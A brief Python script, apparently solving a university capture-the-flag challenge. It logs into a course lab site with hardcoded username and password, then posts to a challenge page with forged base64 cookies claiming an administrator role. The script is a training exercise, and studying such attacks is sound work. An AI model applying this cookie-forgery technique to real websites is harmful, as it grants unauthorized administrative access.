import requests, sys

loginpayload = {"login": "alexrose" , "pwd":"asdfqwerzxcv" }

session = requests.Session()

url = "http://cs495.oregonctf.org/login"

response = session.post(url, data=loginpayload)

targetUrl = "http://cs495.oregonctf.org/challenges/t193c6634f049bcf65cdcac72269eeac25dbb2a6887bdb38873e57d0ef447bc3"

postData = {"subUserName":"admin", "subUserPassword":"5555555555"}
cookieData = {"checksum":"dXNlclJvbGU9YWRtaW5pc3RyYXRvcg==",
              "current":"WVdSdGFXND0="}
response2 = session.post(targetUrl, data=postData, cookies=cookieData)
print(response2.text)
